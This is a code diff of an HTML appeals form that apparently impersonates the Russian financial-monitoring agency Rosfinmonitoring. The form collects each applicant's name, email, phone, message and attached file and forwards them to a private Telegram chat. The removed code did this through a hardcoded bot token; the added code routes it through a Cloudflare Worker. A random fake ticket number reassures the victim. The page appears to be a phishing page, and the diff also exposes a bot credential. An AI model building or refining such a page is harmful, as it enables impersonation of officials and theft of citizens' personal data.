@@ -29,6 +29,7 @@
         .footer-disclaimer { font-size: 11px; color: #a0b2c6; font-style: italic; max-width: 500px; }
         .footer-copyright { color: #8fa2b5; font-size: 11px; font-weight: bold; text-align: right; }
 
+        /* ===== АДАПТИВ ===== */
         @media screen and (max-width: 768px) {
             .navbar-custom { height: 70px; padding: 0 15px; }
             .form-container { margin: 100px auto 20px auto; padding: 20px; }
@@ -37,6 +38,30 @@
             .logo-text p { font-size: 7.5px; }
             .footer-container { flex-direction: column; text-align: center; gap: 15px; }
             .footer-copyright { text-align: center; }
+        }
+
+        /* ===== АНИМАЦИЯ ЗАГРУЗКИ ===== */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #ffffff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .spinner.active {
+            display: inline-block;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .btn-text {
+            display: inline;
+        }
+        .btn-text.hidden {
+            display: none;
         }
     </style>
 </head>
@@ -59,7 +84,7 @@
             <strong>Внимание!</strong> Обращения, направленные через настоящий электронный портал, регистрируются в установленном порядке в соответствии с Федеральным законом № 59-ФЗ «О порядке рассмотрения обращений граждан Российской Федерации»
         </div>
 
-        <form id="appealForm" onsubmit="sendForm(event)">
+        <form id="appealForm">
             <div class="form-group">
                 <label for="fullName">ФИО заявителя / Наименование организации *</label>
                 <input type="text" id="fullName" class="form-control" placeholder="Иванов Иван Иванович" required>
@@ -79,7 +104,7 @@
                     <option value="Сообщение о сомнительных операциях">Сообщение о сомнительных операциях</option>
                     <option value="Вопросы №-115">Вопросы исполнения требований ФЗ №-115</option>
                     <option value="Техподдержка">Запрос техподдержки</option>
-                    <option value="Факт">Факт мошенничества</option>
+                    <option value="Факт мошенничества">Факт мошенничества</option>
                     <option value="Другой вопрос">Другой вопрос</option>
                 </select>
             </div>
@@ -95,7 +120,10 @@
                 <input type="checkbox" id="agreement" required> 
                 <label for="agreement" style="display:inline; font-size:13px;">Я подтверждаю согласие на обработку данных.</label>
             </div>
-            <button type="submit" class="btn-submit">Отправить официальное обращение</button>
+            <button type="submit" class="btn-submit" id="submitBtn">
+                <span class="btn-text">Отправить официальное обращение</span>
+                <span class="spinner" id="spinner"></span>
+            </button>
         </form>
     </div>
 
@@ -123,105 +151,124 @@
     </footer>
 
     <script>
-        // ============================================
-        // 📋 БОТ ДЛЯ ЗАЯВОК: @FormaRosfinBot
-        // ============================================
-        const BOT_TOKEN_APPEALS = "8831492348:AAG9GM8EUjHe0J9NSFO2FqEsVKvbJ95MC4s";
-        const CHAT_ID_APPEALS = "7386406575";
+        (function() {
+            const form = document.getElementById('appealForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = submitBtn.querySelector('.btn-text');
+            const spinner = document.getElementById('spinner');
 
-        // === ОТПРАВКА ЗАЯВКИ В БОТ @FormaRosfinBot ===
-        async function sendForm(event) {
-            event.preventDefault();
-            
-            const button = document.querySelector('.btn-submit');
-            const fullName = document.getElementById('fullName').value.trim();
-            const email = document.getElementById('email').value.trim();
-            const phone = document.getElementById('phone').value.trim();
-            const subject = document.getElementById('subject').value;
-            const message = document.getElementById('message').value.trim();
-            const agreement = document.getElementById('agreement').checked;
-            const fileInput = document.getElementById('file');
-            const file = fileInput.files[0];
+            // ===== ОТПРАВКА ФОРМЫ =====
+            form.addEventListener('submit', async function(event) {
+                event.preventDefault();
 
-            if (!fullName || !email || !phone || !subject || !message) {
-                alert('⚠️ Заполните все обязательные поля!');
-                return;
-            }
-            if (!agreement) {
-                alert('⚠️ Подтвердите согласие на обработку данных!');
-                return;
-            }
-            if (!email.includes('@') || !email.includes('.')) {
-                alert('⚠️ Введите корректный email адрес!');
-                return;
-            }
+                // === СБОР ДАННЫХ ===
+                const fullName = document.getElementById('fullName').value.trim();
+                const email = document.getElementById('email').value.trim();
+                const phone = document.getElementById('phone').value.trim();
+                const subject = document.getElementById('subject').value;
+                const message = document.getElementById('message').value.trim();
+                const agreement = document.getElementById('agreement').checked;
+                const fileInput = document.getElementById('file');
+                const file = fileInput.files[0];
 
-            button.disabled = true;
-            button.innerText = "Отправка...";
+                // === ВАЛИДАЦИЯ ===
+                if (!fullName || !email || !phone || !subject || !message) {
+                    alert('⚠️ Заполните все обязательные поля!');
+                    return;
+                }
+                if (!agreement) {
+                    alert('⚠️ Подтвердите согласие на обработку данных!');
+                    return;
+                }
+                if (!email.includes('@') || !email.includes('.')) {
+                    alert('⚠️ Введите корректный email адрес!');
+                    return;
+                }
 
-            try {
-                const date = new Date();
-                let text = `📋 НОВОЕ ОБРАЩЕНИЕ\n`;
-                text += `═══════════════════════\n`;
-                text += `👤 ФИО: ${fullName}\n`;
-                text += `📧 Email: ${email}\n`;
-                text += `📞 Телефон: ${phone}\n`;
-                text += `📌 Тема: ${subject}\n`;
-                text += `═══════════════════════\n`;
-                text += `📝 Текст обращения:\n${message}\n`;
-                text += `═══════════════════════\n`;
-                text += `🕐 ${date.toLocaleString('ru-RU')}`;
+                // === БЛОКИРУЕМ КНОПКУ ===
+                submitBtn.disabled = true;
+                btnText.classList.add('hidden');
+                spinner.classList.add('active');
 
-                // === ОТПРАВКА В БОТ ДЛЯ ЗАЯВОК (@FormaRosfinBot) ===
-                const url = `https://api.telegram.org/bot${BOT_TOKEN_APPEALS}/sendMessage`;
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID_APPEALS,
-                        text: text,
-                        parse_mode: 'HTML'
-                    })
-                });
+                try {
+                    const date = new Date();
+                    
+                    // === ФОРМИРУЕМ ТЕКСТ ДЛЯ TELEGRAM ===
+                    let text = `📋 НОВОЕ ОБРАЩЕНИЕ В РОСФИНМОНИТОРИНГ\n`;
+                    text += `═══════════════════════\n`;
+                    text += `👤 ФИО: ${fullName}\n`;
+                    text += `📧 Email: ${email}\n`;
+                    text += `📞 Телефон: ${phone}\n`;
+                    text += `📌 Тема: ${subject}\n`;
+                    text += `═══════════════════════\n`;
+                    text += `📝 Текст обращения:\n${message}\n`;
+                    text += `═══════════════════════\n`;
+                    text += `🕐 ${date.toLocaleString('ru-RU')}`;
 
-                const result = await response.json();
-                console.log('📨 Ответ @FormaRosfinBot:', result);
+                    // =============================================
+                    // 🚀 ОТПРАВКА ЧЕРЕЗ CLOUDFLARE WORKER
+                    // =============================================
+                    const WORKER_URL = 'https://round-band-482a.portal-rosfin.workers.dev';
 
-                if (result.ok) {
-                    // Отправка файла если есть
+                    // === 1. ОТПРАВКА ТЕКСТА ===
+                    const response = await fetch(`${WORKER_URL}/telegram`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ text: text })
+                    });
+
+                    const result = await response.json();
+                    console.log('📨 Ответ Cloudflare Worker:', result);
+
+                    if (!result.ok) {
+                        throw new Error(result.error || 'Неизвестная ошибка');
+                    }
+
+                    // === 2. ЕСЛИ ЕСТЬ ФАЙЛ — ОТПРАВЛЯЕМ ===
                     if (file) {
                         const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID_APPEALS);
-                        formData.append('document', file);
+                        formData.append('file', file);
+                        formData.append('caption', `📎 Вложение к обращению от ${fullName}`);
 
-                        const fileResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN_APPEALS}/sendDocument`, {
+                        const fileResponse = await fetch(`${WORKER_URL}/send-file`, {
                             method: 'POST',
                             body: formData
                         });
+
                         const fileResult = await fileResponse.json();
-                        console.log('📎 Файл отправлен:', fileResult);
+                        console.log('📎 Ответ по файлу:', fileResult);
                     }
 
+                    // === УСПЕХ ===
                     const ticketNumber = Math.floor(100000 + Math.random() * 900000);
                     document.getElementById('ticketNumber').innerText = ticketNumber;
                     document.getElementById('successModal').style.display = 'flex';
-                    document.getElementById('appealForm').reset();
-                } else {
-                    alert('❌ Ошибка: ' + (result.description || 'Неизвестная ошибка'));
+                    form.reset();
+
+                } catch (error) {
+                    console.error('❌ Ошибка:', error);
+                    alert(`❌ Ошибка отправки: ${error.message || 'Проверьте интернет'}`);
+                } finally {
+                    // === РАЗБЛОКИРУЕМ КНОПКУ ===
+                    submitBtn.disabled = false;
+                    btnText.classList.remove('hidden');
+                    spinner.classList.remove('active');
                 }
+            });
 
-            } catch (error) {
-                console.error('❌ Ошибка:', error);
-                alert('❌ Ошибка соединения! Проверьте интернет.');
-            } finally {
-                button.disabled = false;
-                button.innerText = "Отправить официальное обращение";
-            }
-        }
+            // ===== ЗАКРЫТИЕ МОДАЛЬНОГО ОКНА =====
+            window.closeModal = function() {
+                document.getElementById('successModal').style.display = 'none';
+            };
 
-        function closeModal() {
-            document.getElementById('successModal').style.display = 'none';
-        }
+            // ===== ЗАКРЫТИЕ ПО КЛИКУ СНАРУЖИ =====
+            document.getElementById('successModal').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    this.style.display = 'none';
+                }
+            });
+
+        })();
     </script>
 </body>
 </html>
